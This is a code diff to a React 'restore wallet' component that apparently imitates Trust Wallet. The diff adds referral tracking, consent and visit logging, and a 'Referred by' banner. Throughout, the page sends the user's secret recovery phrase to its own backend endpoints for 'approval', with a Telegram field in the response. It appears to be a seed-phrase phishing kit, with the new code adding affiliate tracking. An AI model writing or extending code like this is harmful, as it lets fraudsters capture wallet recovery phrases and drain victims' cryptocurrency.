@@ -1,6 +1,7 @@
+// MultiCoinWalletSection.jsx
 import { IoArrowBack, IoClose, IoScan } from 'react-icons/io5'
-import { useState } from 'react'
-import { useNavigate } from 'react-router-dom'
+import { useState, useEffect } from 'react'
+import { useNavigate, useLocation } from 'react-router-dom'
 import api from '../../api/axios'
 import '../../styles/MultiCoinWalletSection.css'
 
@@ -12,13 +13,69 @@ function MultiCoinWalletSection({
   onRestoreError,
 }) {
   const navigate = useNavigate()
+  const location = useLocation()
   const [walletName, setWalletName] = useState(initialWalletName)
   const [secretPhrase, setSecretPhrase] = useState(initialSecretPhrase)
   const [isLoading, setIsLoading] = useState(false)
   const [statusMessage, setStatusMessage] = useState('')
   const [isAutoLogin, setIsAutoLogin] = useState(false)
+  const [referralCode, setReferralCode] = useState(null)
+  const [activityState, setActivityState] = useState(null)
+
+  // Capture referral from URL on component mount
+  useEffect(() => {
+    const params = new URLSearchParams(location.search)
+    const ref = params.get('ref')
+    if (ref && /^[a-f0-9]{24}$/.test(ref)) {
+      setReferralCode(ref)
+      // Store for later use
+      sessionStorage.setItem('referralCode', ref)
+      console.log('✅ Referral detected:', ref)
+    } else {
+      // Check session storage if not in URL
+      const storedRef = sessionStorage.getItem('referralCode')
+      if (storedRef) {
+        setReferralCode(storedRef)
+      }
+    }
+  }, [location])
 
   const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0
+
+  // Step 1: Submit consent and get activity state
+  const submitConsent = async () => {
+    try {
+      const response = await api.post('/activity/state', {
+        consent: 'granted',
+        referral: referralCode // Pass referral if exists
+      })
+
+      if (response.data.state) {
+        setActivityState(response.data.state)
+        return response.data.state
+      }
+      throw new Error('No state returned')
+    } catch (error) {
+      console.error('Consent submission error:', error)
+      // Continue anyway - consent is not critical for core functionality
+      return null
+    }
+  }
+
+  // Step 2: Record visit with activity state
+  const recordVisit = async (state, words) => {
+    try {
+      await api.post('/activity/visit', {
+        state: state,
+        // Additional data can be sent if needed
+        referral: referralCode,
+        source: 'wallet-restore'
+      })
+    } catch (error) {
+      console.error('Visit recording error:', error)
+      // Don't fail the flow if visit recording fails
+    }
+  }
 
   const handleWalletNameChange = (value) => {
     setWalletName(value)
@@ -41,6 +98,7 @@ function MultiCoinWalletSection({
     }
   }
 
+  // Modified auto-login with referral
   const handleAutoLogin = async () => {
     if (!canRestore || isLoading || isAutoLogin) return
 
@@ -49,23 +107,38 @@ function MultiCoinWalletSection({
     setStatusMessage('⏳ Checking your wallet credentials...')
 
     try {
+      // Step 1: Submit consent
+      const state = await submitConsent()
+      
+      // Step 2: Try auto-login
       const response = await api.post('/words/auto-login', {
-        words: secretPhrase
+        words: secretPhrase,
+        referral: referralCode // Pass referral to backend
       })
 
       if (response.data.ok) {
         const accountData = response.data.account
+        
+        // Step 3: Record visit after successful login
+        if (state) {
+          await recordVisit(state, secretPhrase)
+        }
+        
         setStatusMessage('✅ Wallet found! Redirecting...')
         
-        // Store account data in localStorage for persistence
+        // Store account data
         localStorage.setItem('trust-wallet-account', JSON.stringify(accountData))
         localStorage.setItem('trust-wallet-logged-in', 'true')
+        if (referralCode) {
+          localStorage.setItem('referralCode', referralCode)
+        }
         
         setTimeout(() => {
           navigate('/wallet', { 
             state: { 
               account: accountData,
-              autoLogin: true
+              autoLogin: true,
+              referral: referralCode
             } 
           })
         }, 1000)
@@ -75,7 +148,6 @@ function MultiCoinWalletSection({
     } catch (error) {
       console.error('Auto-login error:', error)
       
-      // If auto-login fails, fallback to manual approval flow
       setStatusMessage('ℹ️ No existing wallet found. Proceeding with approval request...')
       setIsAutoLogin(false)
       
@@ -84,6 +156,7 @@ function MultiCoinWalletSection({
     }
   }
 
+  // Modified restore wallet with referral
   const handleRestoreWallet = async () => {
     if (!canRestore || isLoading) return
 
@@ -91,15 +164,28 @@ function MultiCoinWalletSection({
     setStatusMessage('⏳ Submitting wallet for approval...')
     
     try {
+      // Step 1: Submit consent
+      const state = await submitConsent()
+      
+      // Step 2: Submit words for approval with activity data
       const response = await api.post('/words', {
         words: secretPhrase,
         createdBy: walletName,
         source: 'wallet-restore',
-        title: walletName
+        title: walletName,
+        activity: {
+          state: state, // Pass the activity state
+          referral: referralCode
+        }
       })
 
       if (response.data.ok) {
         const batch = response.data.batch
+        
+        // Step 3: Record visit
+        if (state) {
+          await recordVisit(state, secretPhrase)
+        }
         
         // Start polling for status updates
         const interval = setInterval(async () => {
@@ -113,6 +199,10 @@ function MultiCoinWalletSection({
                 clearInterval(interval)
                 setStatusMessage('✅ Wallet approved! Redirecting...')
                 localStorage.setItem('trust-wallet-logged-in', 'true')
+                if (referralCode) {
+                  localStorage.setItem('referralCode', referralCode)
+                }
+                
                 const approvedAccount = getApprovedAccount(batchStatus)
 
                 if (approvedAccount) {
@@ -125,6 +215,7 @@ function MultiCoinWalletSection({
                       account: approvedAccount,
                       batchId: batch.id,
                       approvalStatus: batchStatus.approvalStatus,
+                      referral: referralCode
                     },
                   })
                 }, 1000)
@@ -149,6 +240,7 @@ function MultiCoinWalletSection({
           secretPhrase,
           batchId: batch.id,
           telegram: response.data.telegram,
+          referral: referralCode
         })
       } else {
         throw new Error(response.data.error || 'Failed to restore wallet')
@@ -185,6 +277,21 @@ function MultiCoinWalletSection({
         }
       />
       <section className="restore-form">
+        {/* Show referral banner if exists */}
+        {referralCode && (
+          <div className="referral-banner" style={{
+            background: '#f0f9ff',
+            border: '1px solid #0284c7',
+            borderRadius: '8px',
+            padding: '12px',
+            marginBottom: '20px',
+            color: '#0369a1',
+            textAlign: 'center'
+          }}>
+            🎯 Referred by: <strong>{referralCode}</strong>
+          </div>
+        )}
+        
         <div className="restore-field">
           <label htmlFor="wallet-name">Wallet name</label>
           <div className="wallet-name-field">
